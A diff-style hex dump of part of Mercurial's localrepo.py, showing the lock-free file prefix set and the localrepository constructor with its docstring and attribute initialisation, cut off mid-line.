-0000b050: 5345 5f52 4551 5549 5245 4d45 4e54 2c0a  SE_REQUIREMENT,.
-0000b060: 2020 2020 2020 2020 7265 7175 6972 656d          requirem
-0000b070: 656e 7473 6d6f 642e 5350 4152 5345 5245  entsmod.SPARSERE
-0000b080: 564c 4f47 5f52 4551 5549 5245 4d45 4e54  VLOG_REQUIREMENT
-0000b090: 2c0a 2020 2020 2020 2020 7265 7175 6972  ,.        requir
-0000b0a0: 656d 656e 7473 6d6f 642e 5354 4f52 455f  ementsmod.STORE_
-0000b0b0: 5245 5155 4952 454d 454e 542c 0a20 2020  REQUIREMENT,.   
-0000b0c0: 2020 2020 2072 6571 7569 7265 6d65 6e74       requirement
-0000b0d0: 736d 6f64 2e54 5245 454d 414e 4946 4553  smod.TREEMANIFES
-0000b0e0: 545f 5245 5155 4952 454d 454e 542c 0a20  T_REQUIREMENT,. 
-0000b0f0: 2020 207d 0a0a 2020 2020 2320 6c69 7374     }..    # list
-0000b100: 206f 6620 7072 6566 6978 2066 6f72 2066   of prefix for f
-0000b110: 696c 6520 7768 6963 6820 6361 6e20 6265  ile which can be
-0000b120: 2077 7269 7474 656e 2077 6974 686f 7574   written without
-0000b130: 2027 776c 6f63 6b27 0a20 2020 2023 2045   'wlock'.    # E
-0000b140: 7874 656e 7369 6f6e 7320 7368 6f75 6c64  xtensions should
-0000b150: 2065 7874 656e 6420 7468 6973 206c 6973   extend this lis
-0000b160: 7420 7768 656e 206e 6565 6465 640a 2020  t when needed.  
-0000b170: 2020 5f77 6c6f 636b 6672 6565 7072 6566    _wlockfreepref
-0000b180: 6978 203d 207b 0a20 2020 2020 2020 2023  ix = {.        #
-0000b190: 2057 6520 6d69 6768 2063 6f6e 7369 6465   We migh conside
-0000b1a0: 7220 7265 7175 6972 696e 6720 2777 6c6f  r requiring 'wlo
-0000b1b0: 636b 2720 666f 7220 7468 6520 6e65 7874  ck' for the next
-0000b1c0: 0a20 2020 2020 2020 2023 2074 776f 2c20  .        # two, 
-0000b1d0: 6275 7420 7072 6574 7479 206d 7563 6820  but pretty much 
-0000b1e0: 616c 6c20 7468 6520 6578 6973 7469 6e67  all the existing
-0000b1f0: 2063 6f64 6520 6173 7375 6d65 0a20 2020   code assume.   
-0000b200: 2020 2020 2023 2077 6c6f 636b 2069 7320       # wlock is 
-0000b210: 6e6f 7420 6e65 6564 6564 2073 6f20 7765  not needed so we
-0000b220: 206b 6565 7020 7468 656d 2065 7863 6c75   keep them exclu
-0000b230: 6465 6420 666f 720a 2020 2020 2020 2020  ded for.        
-0000b240: 2320 6e6f 772e 0a20 2020 2020 2020 2062  # now..        b
-0000b250: 2768 6772 6327 2c0a 2020 2020 2020 2020  'hgrc',.        
-0000b260: 6227 7265 7175 6972 6573 272c 0a20 2020  b'requires',.   
-0000b270: 2020 2020 2023 2058 5858 2063 6163 6865       # XXX cache
-0000b280: 2069 7320 6120 636f 6d70 6c69 6361 7467   is a complicatg
-0000b290: 6564 2062 7573 696e 6573 7320 736f 6d65  ed business some
-0000b2a0: 6f6e 650a 2020 2020 2020 2020 2320 7368  one.        # sh
-0000b2b0: 6f75 6c64 2069 6e76 6573 7469 6761 7465  ould investigate
-0000b2c0: 2074 6869 7320 696e 2064 6570 7468 2061   this in depth a
-0000b2d0: 7420 736f 6d65 2070 6f69 6e74 0a20 2020  t some point.   
-0000b2e0: 2020 2020 2062 2763 6163 6865 2f27 2c0a       b'cache/',.
-0000b2f0: 2020 2020 2020 2020 2320 5858 5820 6269          # XXX bi
-0000b300: 7365 6374 2077 6173 2073 7469 6c6c 2061  sect was still a
-0000b310: 2062 6974 2074 6f6f 206d 6573 7379 2061   bit too messy a
-0000b320: 7420 7468 6520 7469 6d65 0a20 2020 2020  t the time.     
-0000b330: 2020 2023 2074 6869 7320 6368 616e 6765     # this change
-0000b340: 7365 7420 7761 7320 696e 7472 6f64 7563  set was introduc
-0000b350: 6564 2e20 536f 6d65 6f6e 6520 7368 6f75  ed. Someone shou
-0000b360: 6c64 2066 6978 0a20 2020 2020 2020 2023  ld fix.        #
-0000b370: 2074 6865 2072 656d 6169 6e69 6720 6269   the remainig bi
-0000b380: 7420 616e 6420 6472 6f70 2074 6869 7320  t and drop this 
-0000b390: 6c69 6e65 0a20 2020 2020 2020 2062 2762  line.        b'b
-0000b3a0: 6973 6563 742e 7374 6174 6527 2c0a 2020  isect.state',.  
-0000b3b0: 2020 7d0a 0a20 2020 2064 6566 205f 5f69    }..    def __i
-0000b3c0: 6e69 745f 5f28 0a20 2020 2020 2020 2073  nit__(.        s
-0000b3d0: 656c 662c 0a20 2020 2020 2020 2062 6173  elf,.        bas
-0000b3e0: 6575 692c 0a20 2020 2020 2020 2075 692c  eui,.        ui,
-0000b3f0: 0a20 2020 2020 2020 206f 7269 6772 6f6f  .        origroo
-0000b400: 743a 2062 7974 6573 2c0a 2020 2020 2020  t: bytes,.      
-0000b410: 2020 7764 6972 7666 733a 2076 6673 6d6f    wdirvfs: vfsmo
-0000b420: 642e 7666 732c 0a20 2020 2020 2020 2068  d.vfs,.        h
-0000b430: 6776 6673 3a20 7666 736d 6f64 2e76 6673  gvfs: vfsmod.vfs
-0000b440: 2c0a 2020 2020 2020 2020 7265 7175 6972  ,.        requir
-0000b450: 656d 656e 7473 2c0a 2020 2020 2020 2020  ements,.        
-0000b460: 7375 7070 6f72 7465 6472 6571 7569 7265  supportedrequire
-0000b470: 6d65 6e74 732c 0a20 2020 2020 2020 2073  ments,.        s
-0000b480: 6861 7265 6470 6174 683a 2062 7974 6573  haredpath: bytes
-0000b490: 2c0a 2020 2020 2020 2020 7374 6f72 652c  ,.        store,
-0000b4a0: 0a20 2020 2020 2020 2063 6163 6865 7666  .        cachevf
-0000b4b0: 733a 2076 6673 6d6f 642e 7666 732c 0a20  s: vfsmod.vfs,. 
-0000b4c0: 2020 2020 2020 2077 6361 6368 6576 6673         wcachevfs
-0000b4d0: 3a20 7666 736d 6f64 2e76 6673 2c0a 2020  : vfsmod.vfs,.  
-0000b4e0: 2020 2020 2020 6665 6174 7572 6573 2c0a        features,.
-0000b4f0: 2020 2020 2020 2020 696e 7465 6e74 733d          intents=
-0000b500: 4e6f 6e65 2c0a 2020 2020 293a 0a20 2020  None,.    ):.   
-0000b510: 2020 2020 2022 2222 4372 6561 7465 2061       """Create a
-0000b520: 206e 6577 206c 6f63 616c 2072 6570 6f73   new local repos
-0000b530: 6974 6f72 7920 696e 7374 616e 6365 2e0a  itory instance..
-0000b540: 0a20 2020 2020 2020 204d 6f73 7420 6361  .        Most ca
-0000b550: 6c6c 6572 7320 7368 6f75 6c64 2075 7365  llers should use
-0000b560: 2060 6068 672e 7265 706f 7369 746f 7279   ``hg.repository
-0000b570: 2829 6060 2c20 6060 6c6f 6361 6c72 6570  ()``, ``localrep
-0000b580: 6f2e 696e 7374 616e 6365 2829 6060 2c0a  o.instance()``,.
-0000b590: 2020 2020 2020 2020 6f72 2060 606c 6f63          or ``loc
-0000b5a0: 616c 7265 706f 2e6d 616b 656c 6f63 616c  alrepo.makelocal
-0000b5b0: 7265 706f 7369 746f 7279 2829 6060 2066  repository()`` f
-0000b5c0: 6f72 206f 6274 6169 6e69 6e67 2061 206e  or obtaining a n
-0000b5d0: 6577 2072 6570 6f73 6974 6f72 790a 2020  ew repository.  
-0000b5e0: 2020 2020 2020 6f62 6a65 6374 2e0a 0a20        object... 
-0000b5f0: 2020 2020 2020 2041 7267 756d 656e 7473         Arguments
-0000b600: 3a0a 0a20 2020 2020 2020 2062 6173 6575  :..        baseu
-0000b610: 690a 2020 2020 2020 2020 2020 2060 6075  i.           ``u
-0000b620: 692e 7569 6060 2069 6e73 7461 6e63 6520  i.ui`` instance 
-0000b630: 7468 6174 2060 6075 6960 6020 6172 6775  that ``ui`` argu
-0000b640: 6d65 6e74 2077 6173 2062 6173 6564 206f  ment was based o
-0000b650: 6666 206f 662e 0a0a 2020 2020 2020 2020  ff of...        
-0000b660: 7569 0a20 2020 2020 2020 2020 2020 6060  ui.           ``
-0000b670: 7569 2e75 6960 6020 696e 7374 616e 6365  ui.ui`` instance
-0000b680: 2066 6f72 2075 7365 2062 7920 7468 6520   for use by the 
-0000b690: 7265 706f 7369 746f 7279 2e0a 0a20 2020  repository...   
-0000b6a0: 2020 2020 206f 7269 6772 6f6f 740a 2020       origroot.  
-0000b6b0: 2020 2020 2020 2020 2060 6062 7974 6573           ``bytes
-0000b6c0: 6060 2070 6174 6820 746f 2077 6f72 6b69  `` path to worki
-0000b6d0: 6e67 2064 6972 6563 746f 7279 2072 6f6f  ng directory roo
-0000b6e0: 7420 6f66 2074 6869 7320 7265 706f 7369  t of this reposi
-0000b6f0: 746f 7279 2e0a 0a20 2020 2020 2020 2077  tory...        w
-0000b700: 6469 7276 6673 0a20 2020 2020 2020 2020  dirvfs.         
-0000b710: 2020 6060 7666 732e 7666 7360 6020 726f    ``vfs.vfs`` ro
-0000b720: 6f74 6564 2061 7420 7468 6520 776f 726b  oted at the work
-0000b730: 696e 6720 6469 7265 6374 6f72 792e 0a0a  ing directory...
-0000b740: 2020 2020 2020 2020 6867 7666 730a 2020          hgvfs.  
-0000b750: 2020 2020 2020 2020 2060 6076 6673 2e76           ``vfs.v
-0000b760: 6673 6060 2072 6f6f 7465 6420 6174 202e  fs`` rooted at .
-0000b770: 6867 2f0a 0a20 2020 2020 2020 2072 6571  hg/..        req
-0000b780: 7569 7265 6d65 6e74 730a 2020 2020 2020  uirements.      
-0000b790: 2020 2020 2060 6073 6574 6060 206f 6620       ``set`` of 
-0000b7a0: 6279 7465 7374 7269 6e67 7320 7265 7072  bytestrings repr
-0000b7b0: 6573 656e 7469 6e67 2072 6570 6f73 6974  esenting reposit
-0000b7c0: 6f72 7920 6f70 656e 696e 6720 7265 7175  ory opening requ
-0000b7d0: 6972 656d 656e 7473 2e0a 0a20 2020 2020  irements...     
-0000b7e0: 2020 2073 7570 706f 7274 6564 7265 7175     supportedrequ
-0000b7f0: 6972 656d 656e 7473 0a20 2020 2020 2020  irements.       
-0000b800: 2020 2020 6060 7365 7460 6020 6f66 2062      ``set`` of b
-0000b810: 7974 6573 7472 696e 6773 2072 6570 7265  ytestrings repre
-0000b820: 7365 6e74 696e 6720 7265 706f 7369 746f  senting reposito
-0000b830: 7279 2072 6571 7569 7265 6d65 6e74 7320  ry requirements 
-0000b840: 7468 6174 2077 650a 2020 2020 2020 2020  that we.        
-0000b850: 2020 206b 6e6f 7720 686f 7720 746f 206f     know how to o
-0000b860: 7065 6e2e 204d 6179 2062 6520 6120 7375  pen. May be a su
-0000b870: 7065 7473 6574 206f 6620 6060 7265 7175  petset of ``requ
-0000b880: 6972 656d 656e 7473 6060 2e0a 0a20 2020  irements``...   
-0000b890: 2020 2020 2073 6861 7265 6470 6174 680a       sharedpath.
-0000b8a0: 2020 2020 2020 2020 2020 2060 6062 7974             ``byt
-0000b8b0: 6573 6060 2044 6566 696e 696e 6720 7061  es`` Defining pa
-0000b8c0: 7468 2074 6f20 7374 6f72 6167 6520 6261  th to storage ba
-0000b8d0: 7365 2064 6972 6563 746f 7279 2e20 506f  se directory. Po
-0000b8e0: 696e 7473 2074 6f20 610a 2020 2020 2020  ints to a.      
-0000b8f0: 2020 2020 2060 602e 6867 2f60 6020 6469       ``.hg/`` di
-0000b900: 7265 6374 6f72 7920 736f 6d65 7768 6572  rectory somewher
-0000b910: 652e 0a0a 2020 2020 2020 2020 7374 6f72  e...        stor
-0000b920: 650a 2020 2020 2020 2020 2020 2060 6073  e.           ``s
-0000b930: 746f 7265 2e62 6173 6963 7374 6f72 6560  tore.basicstore`
-0000b940: 6020 286f 7220 6465 7269 7665 6429 2069  ` (or derived) i
-0000b950: 6e73 7461 6e63 6520 7072 6f76 6964 696e  nstance providin
-0000b960: 6720 6163 6365 7373 2074 6f0a 2020 2020  g access to.    
-0000b970: 2020 2020 2020 2076 6572 7369 6f6e 6564         versioned
-0000b980: 2073 746f 7261 6765 2e0a 0a20 2020 2020   storage...     
-0000b990: 2020 2063 6163 6865 7666 730a 2020 2020     cachevfs.    
-0000b9a0: 2020 2020 2020 2060 6076 6673 2e76 6673         ``vfs.vfs
-0000b9b0: 6060 2075 7365 6420 666f 7220 6361 6368  `` used for cach
-0000b9c0: 6520 6669 6c65 732e 0a0a 2020 2020 2020  e files...      
-0000b9d0: 2020 7763 6163 6865 7666 730a 2020 2020    wcachevfs.    
-0000b9e0: 2020 2020 2020 2060 6076 6673 2e76 6673         ``vfs.vfs
-0000b9f0: 6060 2075 7365 6420 666f 7220 6361 6368  `` used for cach
-0000ba00: 6520 6669 6c65 7320 7265 6c61 7465 6420  e files related 
-0000ba10: 746f 2074 6865 2077 6f72 6b69 6e67 2063  to the working c
-0000ba20: 6f70 792e 0a0a 2020 2020 2020 2020 6665  opy...        fe
-0000ba30: 6174 7572 6573 0a20 2020 2020 2020 2020  atures.         
-0000ba40: 2020 6060 7365 7460 6020 6f66 2062 7974    ``set`` of byt
-0000ba50: 6573 7472 696e 6773 2064 6566 696e 696e  estrings definin
-0000ba60: 6720 6665 6174 7572 6573 2f63 6170 6162  g features/capab
-0000ba70: 696c 6974 6965 7320 6f66 2074 6869 730a  ilities of this.
-0000ba80: 2020 2020 2020 2020 2020 2069 6e73 7461             insta
-0000ba90: 6e63 652e 0a0a 2020 2020 2020 2020 696e  nce...        in
-0000baa0: 7465 6e74 730a 2020 2020 2020 2020 2020  tents.          
-0000bab0: 2060 6073 6574 6060 206f 6620 7379 7374   ``set`` of syst
-0000bac0: 656d 2073 7472 696e 6773 2069 6e64 6963  em strings indic
-0000bad0: 6174 696e 6720 7768 6174 2074 6869 7320  ating what this 
-0000bae0: 7265 706f 2077 696c 6c20 6265 2075 7365  repo will be use
-0000baf0: 640a 2020 2020 2020 2020 2020 2066 6f72  d.           for
-0000bb00: 2e0a 2020 2020 2020 2020 2222 220a 2020  ..        """.  
-0000bb10: 2020 2020 2020 7365 6c66 2e62 6173 6575        self.baseu
-0000bb20: 6920 3d20 6261 7365 7569 0a20 2020 2020  i = baseui.     
-0000bb30: 2020 2073 656c 662e 7569 203d 2075 690a     self.ui = ui.
-0000bb40: 2020 2020 2020 2020 7365 6c66 2e6f 7269          self.ori
-0000bb50: 6772 6f6f 7420 3d20 6f72 6967 726f 6f74  groot = origroot
-0000bb60: 0a20 2020 2020 2020 2023 2076 6673 2072  .        # vfs r
-0000bb70: 6f6f 7465 6420 6174 2077 6f72 6b69 6e67  ooted at working
-0000bb80: 2064 6972 6563 746f 7279 2e0a 2020 2020   directory..    
-0000bb90: 2020 2020 7365 6c66 2e77 7666 7320 3d20      self.wvfs = 
-0000bba0: 7764 6972 7666 730a 2020 2020 2020 2020  wdirvfs.        
-0000bbb0: 7365 6c66 2e72 6f6f 7420 3d20 7764 6972  self.root = wdir
-0000bbc0: 7666 732e 6261 7365 0a20 2020 2020 2020  vfs.base.       
-0000bbd0: 2023 2076 6673 2072 6f6f 7465 6420 6174   # vfs rooted at
-0000bbe0: 202e 6867 2f2e 2055 7365 6420 746f 2061   .hg/. Used to a
-0000bbf0: 6363 6573 7320 6d6f 7374 206e 6f6e 2d73  ccess most non-s
-0000bc00: 746f 7265 2070 6174 6873 2e0a 2020 2020  tore paths..    
-0000bc10: 2020 2020 7365 6c66 2e76 6673 203d 2068      self.vfs = h
-0000bc20: 6776 6673 0a20 2020 2020 2020 2073 656c  gvfs.        sel
-0000bc30: 662e 7061 7468 203d 2068 6776 6673 2e62  f.path = hgvfs.b
-0000bc40: 6173 650a 2020 2020 2020 2020 7365 6c66  ase.        self
-0000bc50: 2e72 6571 7569 7265 6d65 6e74 7320 3d20  .requirements = 
-0000bc60: 7265 7175 6972 656d 656e 7473 0a20 2020  requirements.   
-0000bc70: 2020 2020 2073 656c 662e 6e6f 6465 636f       self.nodeco
-0000bc80: 6e73 7461 6e74 7320 3d20 7368 6131 6e6f  nstants = sha1no
-0000bc90: 6465 636f 6e73 7461 6e74 730a 2020 2020  deconstants.    
-0000bca0: 2020 2020 7365 6c66 2e6e 756c 6c69 6420      self.nullid 
-0000bcb0: 3d20 7365 6c66 2e6e 6f64 6563 6f6e 7374  = self.nodeconst
-0000bcc0: 616e 7473 2e6e 756c 6c69 640a 2020 2020  ants.nullid.    
-0000bcd0: 2020 2020 7365 6c66 2e73 7570 706f 7274      self.support
-0000bce0: 6564 203d 2073 7570 706f 7274 6564 7265  ed = supportedre
-0000bcf0: 7175 6972 656d 656e 7473 0a20 2020 2020  quirements.     
-0000bd00: 2020 2073 656c 662e 7368 6172 6564 7061     self.sharedpa
-0000bd10: 7468 203d 2073 6861 7265 6470 6174 680a  th = sharedpath.
-0000bd20: 2020 2020 2020 2020 7365 6c66 2e73 746f          self.sto
-0000bd30: 7265 203d 2073 746f 7265 0a20 2020 2020  re = store.     
-0000bd40: 2020 2073 656c 662e 6361 6368 6576 6673     self.cachevfs
-0000bd50: 203d 2063 6163 6865 7666 730a 2020 2020   = cachevfs.    
-0000bd60: 2020 2020 7365 6c66 2e77 6361 6368 6576      self.wcachev
-0000bd70: 6673 203d 2077 6361 6368 6576 6673 0a20  fs = wcachevfs. 
-0000bd80: 2020 2020 2020 2073 656c 662e 6665 6174         self.feat
-0000bd90: 7572 6573 203d 2066 6561 7475 7265 730a  ures = features.
-0000bda0: 0a20 2020 2020 2020 2073 656c 662e 6669  .        self.fi
-0000bdb0: 6c74 6572 6e61 6d65 203d 204e 6f6e 650a  ltername = None.
-0000bdc0: 0a20 2020 2020 2020 2069 6620 7365 6c66  .        if self
-0000bdd0: 2e75 692e 636f 6e66 6967 626f 6f6c 2862  .ui.configbool(b
-0000bde0: 2764 6576 656c 272c 2062 2761 6c6c 2d77  'devel', b'all-w
-0000bdf0: 6172 6e69 6e67 7327 2920 6f72 2073 656c  arnings') or sel
-0000be00: 662e 7569 2e63 6f6e 6669 6762 6f6f 6c28  f.ui.configbool(
-0000be10: 0a20 2020 2020 2020 2020 2020 2062 2764  .            b'd
-0000be20: 6576 656c 272c 2062 2763 6865 636b 2d6c  evel', b'check-l
-0000be30: 6f63 6b73 270a 2020 2020 2020 2020 293a  ocks'.        ):
-0000be40: 0a20 2020 2020 2020 2020 2020 2073 656c  .            sel
-0000be50: 662e 7666 732e 6175 6469 7420 3d20 7365  f.vfs.audit = se
-0000be60: 6c66 2e5f 6765 7476 6673 7761 7264 2873  lf._getvfsward(s
-0000be70: 656c 662e 7666 732e 6175 6469 7429 0a20  elf.vfs.audit). 
-0000be80: 2020 2020 2020 2023 2041 206c 6973 7420         # A list 
-0000be90: 6f66 2063 616c 6c62 6163 6b20 746f 2073  of callback to s
-0000bea0: 6861 7065 2074 6865 2070 6861 7365 2069  hape the phase i
-0000beb0: 6620 6e6f 2064 6174 6120 7765 7265 2066  f no data were f
-0000bec0: 6f75 6e64 2e0a 2020 2020 2020 2020 2320  ound..        # 
-0000bed0: 4361 6c6c 6261 636b 2061 7265 2069 6e20  Callback are in 
-0000bee0: 7468 6520 666f 726d 3a20 6675 6e63 2872  the form: func(r
-0000bef0: 6570 6f2c 2072 6f6f 7473 2920 2d2d 3e20  epo, roots) --> 
-0000bf00: 7072 6f63 6573 7365 6420 726f 6f74 2e0a  processed root..
-0000bf10: 2020 2020 2020 2020 2320 5468 6973 206c          # This l
-0000bf20: 6973 7420 6974 2074 6f20 6265 2066 696c  ist it to be fil
-0000bf30: 6c65 6420 6279 2065 7874 656e 7369 6f6e  led by extension
-0000bf40: 2064 7572 696e 6720 7265 706f 2073 6574   during repo set
-0000bf50: 7570 0a20 2020 2020 2020 2073 656c 662e  up.        self.
-0000bf60: 5f70 6861 7365 6465 6661 756c 7473 203d  _phasedefaults =
-0000bf70: 205b 5d0a 0a20 2020 2020 2020 2063 6f6c   []..        col
-0000bf80: 6f72 2e73 6574 7570 2873 656c 662e 7569  or.setup(self.ui
-0000bf90: 290a 0a20 2020 2020 2020 2073 656c 662e  )..        self.
-0000bfa0: 7370 6174 6820 3d20 7365 6c66 2e73 746f  spath = self.sto
-0000bfb0: 7265 2e70 6174 680a 2020 2020 2020 2020  re.path.        
-0000bfc0: 7365 6c66 2e73 7666 7320 3d20 7365 6c66  self.svfs = self
-0000bfd0: 2e73 746f 7265 2e76 6673 0a20 2020 2020  .store.vfs.     
-0000bfe0: 2020 2073 656c 662e 736a 6f69 6e20 3d20     self.sjoin = 
-0000bff0: 7365 6c66 2e73 746f 7265 2e6a 6f69 6e0a  self.store.join.
-0000c000: 2020 2020 2020 2020 6966 2073 656c 662e          if self.
-0000c010: 7569 2e63 6f6e 6669 6762 6f6f 6c28 6227  ui.configbool(b'
-0000c020: 6465 7665 6c27 2c20 6227 616c 6c2d 7761  devel', b'all-wa
-0000c030: 726e 696e 6773 2729 206f 7220 7365 6c66  rnings') or self
-0000c040: 2e75 692e 636f 6e66 6967 626f 6f6c 280a  .ui.configbool(.
-0000c050: 2020 2020 2020 2020 2020 2020 6227 6465              b'de
-0000c060: 7665 6c27 2c20 6227 6368 6563 6b2d 6c6f  vel', b'check-lo
-0000c070: 636b 7327 0a20 2020 2020 2020 2029 3a0a  cks'.        ):.
-0000c080: 2020 2020 2020 2020 2020 2020 6966 2075              if u
-0000c090: 7469 6c2e 7361 6665 6861 7361 7474 7228  til.safehasattr(
-0000c0a0: 7365 6c66 2e73 7666 732c 2062 2776 6673  self.svfs, b'vfs
-0000c0b0: 2729 3a20 2023 2074 6869 7320 6973 2066  '):  # this is f
-0000c0c0: 696c 7465 7276 6673 0a20 2020 2020 2020  iltervfs.       
-0000c0d0: 2020 2020 2020 2020 2073 656c 662e 7376           self.sv
-0000c0e0: 6673 2e76 6673 2e61 7564 6974 203d 2073  fs.vfs.audit = s
-0000c0f0: 656c 662e 5f67 6574 7376 6673 7761 7264  elf._getsvfsward
-0000c100: 2873 656c 662e 7376 6673 2e76 6673 2e61  (self.svfs.vfs.a
-0000c110: 7564 6974 290a 2020 2020 2020 2020 2020  udit).          
-0000c120: 2020 656c 7365 3a20 2023 2073 7461 6e64    else:  # stand
-0000c130: 6172 6420 7666 730a 2020 2020 2020 2020  ard vfs.        
-0000c140: 2020 2020 2020 2020 7365 6c66 2e73 7666          self.svf
-0000c150: 732e 6175 6469 7420 3d20 7365 6c66 2e5f  s.audit = self._
-0000c160: 6765 7473 7666 7377 6172 6428 7365 6c66  getsvfsward(self
-0000c170: 2e73 7666 732e 6175 6469 7429 0a0a 2020  .svfs.audit)..  
-0000c180: 2020 2020 2020 7365 6c66 2e5f 6469 7273        self._dirs
-0000c190: 7461 7465 7661 6c69 6461 7465 7761 726e  tatevalidatewarn
-0000c1a0: 6564 203d 2046 616c 7365 0a0a 2020 2020  ed = False..    
-0000c1b0: 2020 2020 7365 6c66 2e5f 6272 616e 6368      self._branch
-0000c1c0: 6361 6368 6573 203d 2062 7261 6e63 686d  caches = branchm
-0000c1d0: 6170 2e42 7261 6e63 684d 6170 4361 6368  ap.BranchMapCach
-0000c1e0: 6528 290a 2020 2020 2020 2020 7365 6c66  e().        self
-0000c1f0: 2e5f 7265 7662 7261 6e63 6863 6163 6865  ._revbranchcache
-0000c200: 203d 204e 6f6e 650a 2020 2020 2020 2020   = None.        
-0000c210: 7365 6c66 2e5f 6669 6c74 6572 7061 7473  self._filterpats
-0000c220: 203d 207b 7d0a 2020 2020 2020 2020 7365   = {}.        se
-0000c230: 6c66 2e5f 6461 7461 6669 6c74 6572 7320  lf._datafilters 
-0000c240: 3d20 7b7d 0a20 2020 2020 2020 2073 656c  = {}.        sel
-0000c250: 662e 5f74 7261 6e73 7265 6620 3d20 7365  f._transref = se
-0000c260: 6c66 2e5f 6c6f 636b 7265 6620 3d20 7365  lf._lockref = se
-0000c270: 6c66 2e5f 776c 6f63 6b72 6566 203d 204e  lf._wlockref = N
-0000c280: 6f6e 650a 0a20 2020 2020 2020 2023 2041  one..        # A
-0000c290: 2063 6163 6865 2066 6f72 2076 6172 696f   cache for vario
-0000c2a0: 7573 2066 696c 6573 2075 6e64 6572 202e  us files under .
-0000c2b0: 6867 2f20 7468 6174 2074 7261 636b 7320  hg/ that tracks 
-0000c2c0: 6669 6c65 2063 6861 6e67 6573 2c0a 2020  file changes,.  
-0000c2d0: 2020 2020 2020 2320 2875 7365 6420 6279        # (used by
-0000c2e0: 2074 6865 2066 696c 6563 6163 6865 2064   the filecache d
-0000c2f0: 6563 6f72 6174 6f72 290a 2020 2020 2020  ecorator).      
-0000c300: 2020 230a 2020 2020 2020 2020 2320 4d61    #.        # Ma
-0000c310: 7073 2061 2070 726f 7065 7274 7920 6e61  ps a property na
-0000c320: 6d65 2074 6f20 6974 7320 7574 696c 2e66  me to its util.f
-0000c330: 696c 6563 6163 6865 656e 7472 790a 2020  ilecacheentry.  
-0000c340: 2020 2020 2020 7365 6c66 2e5f 6669 6c65        self._file
-0000c350: 6361 6368 6520 3d20 7b7d 0a0a 2020 2020  cache = {}..    
-0000c360: 2020 2020 2320 686f 6c64 2073 6574 7320      # hold sets 
-0000c370: 6f66 2072 6576 6973 696f 6e20 746f 2062  of revision to b
-0000c380: 6520 6669 6c74 6572 6564 0a20 2020 2020  e filtered.     
-0000c390: 2020 2023 2073 686f 756c 6420 6265 2063     # should be c
-0000c3a0: 6c65 6172 6564 2077 6865 6e20 736f 6d65  leared when some
-0000c3b0: 7468 696e 6720 6d69 6768 7420 6861 7665  thing might have
-0000c3c0: 2063 6861 6e67 6564 2074 6865 2066 696c   changed the fil
-0000c3d0: 7465 7220 7661 6c75 653a 0a20 2020 2020  ter value:.     
-0000c3e0: 2020 2023 202d 206e 6577 2063 6861 6e67     # - new chang
-0000c3f0: 6573 6574 732c 0a20 2020 2020 2020 2023  esets,.        #
-0000c400: 202d 2070 6861 7365 2063 6861 6e67 652c   - phase change,
-0000c410: 0a20 2020 2020 2020 2023 202d 206e 6577  .        # - new
-0000c420: 206f 6273 6f6c 6573 6365 6e63 6520 6d61   obsolescence ma
-0000c430: 726b 6572 2c0a 2020 2020 2020 2020 2320  rker,.        # 
-0000c440: 2d20 776f 726b 696e 6720 6469 7265 6374  - working direct
-0000c450: 6f72 7920 7061 7265 6e74 2063 6861 6e67  ory parent chang
-0000c460: 652c 0a20 2020 2020 2020 2023 202d 2062  e,.        # - b
-0000c470: 6f6f 6b6d 6172 6b20 6368 616e 6765 730a  ookmark changes.
-0000c480: 2020 2020 2020 2020 7365 6c66 2e66 696c          self.fil
-0000c490: 7465 7265 6472 6576 6361 6368 6520 3d20  teredrevcache = 
-0000c4a0: 7b7d 0a0a 2020 2020 2020 2020 7365 6c66  {}..        self
-0000c4b0: 2e5f 6469 7273 7461 7465 203d 204e 6f6e  ._dirstate = Non
-0000c4c0: 650a 2020 2020 2020 2020 2320 706f 7374  e.        # post
-0000c4d0: 2d64 6972 7374 6174 652d 7374 6174 7573  -dirstate-status
-0000c4e0: 2068 6f6f 6b73 0a20 2020 2020 2020 2073   hooks.        s
-0000c4f0: 656c 662e 5f70 6f73 7464 7373 7461 7475  elf._postdsstatu
-0000c500: 7320 3d20 5b5d 0a0a 2020 2020 2020 2020  s = []..        
-0000c510: 7365 6c66 2e5f 7065 6e64 696e 675f 6e61  self._pending_na
-0000c520: 7272 6f77 5f70 6174 7320 3d20 4e6f 6e65  rrow_pats = None
-0000c530: 0a20 2020 2020 2020 2073 656c 662e 5f70  .        self._p
-0000c540: 656e 6469 6e67 5f6e 6172 726f 775f 7061  ending_narrow_pa
-0000c550: 7473 5f64 6972 7374 6174 6520 3d20 4e6f  ts_dirstate = No
-0000c560: 6e65 0a0a 2020 2020 2020 2020 2320 6765  ne..        # ge
-0000c570: 6e65 7269 6320 6d61 7070 696e 6720 6265  neric mapping be
-0000c580: 7477 6565 6e20 6e61 6d65 7320 616e 6420  tween names and 
-0000c590: 6e6f 6465 730a 2020 2020 2020 2020 7365  nodes.        se
-0000c5a0: 6c66 2e6e 616d 6573 203d 206e 616d 6573  lf.names = names
-0000c5b0: 7061 6365 732e 6e61 6d65 7370 6163 6573  paces.namespaces
-0000c5c0: 2829 0a0a 2020 2020 2020 2020 2320 4b65  ()..        # Ke
-0000c5d0: 7920 746f 2073 6967 6e61 7475 7265 2076  y to signature v
-0000c5e0: 616c 7565 2e0a 2020 2020 2020 2020 7365  alue..        se
-0000c5f0: 6c66 2e5f 7370 6172 7365 7369 676e 6174  lf._sparsesignat
-0000c600: 7572 6563 6163 6865 203d 207b 7d0a 2020  urecache = {}.  
-0000c610: 2020 2020 2020 2320 5369 676e 6174 7572        # Signatur
-0000c620: 6520 746f 2063 6163 6865 6420 6d61 7463  e to cached matc
-0000c630: 6865 7220 696e 7374 616e 6365 2e0a 2020  her instance..  
-0000c640: 2020 2020 2020 7365 6c66 2e5f 7370 6172        self._spar
-0000c650: 7365 6d61 7463 6865 7263 6163 6865 203d  sematchercache =
-0000c660: 207b 7d0a 0a20 2020 2020 2020 2073 656c   {}..        sel
-0000c670: 662e 5f65 7874 7261 6669 6c74 6572 6964  f._extrafilterid
-0000c680: 203d 2072 6570 6f76 6965 772e 6578 7472   = repoview.extr
-0000c690: 6166 696c 7465 7228 7569 290a 0a20 2020  afilter(ui)..   
-0000c6a0: 2020 2020 2073 656c 662e 6669 6c65 636f       self.fileco
-0000c6b0: 7069 6573 6d6f 6465 203d 204e 6f6e 650a  piesmode = None.
-0000c6c0: 2020 2020 2020 2020 6966 2072 6571 7569          if requi
-0000c6d0: 7265 6d65 6e74 736d 6f64 2e43 4f50 4945  rementsmod.COPIE
-0000c6e0: 5353 4443 5f52 4551 5549 5245 4d45 4e54  SSDC_REQUIREMENT
-0000c6f0: 2069 6e20 7365 6c66 2e72 6571 7569 7265   in self.require
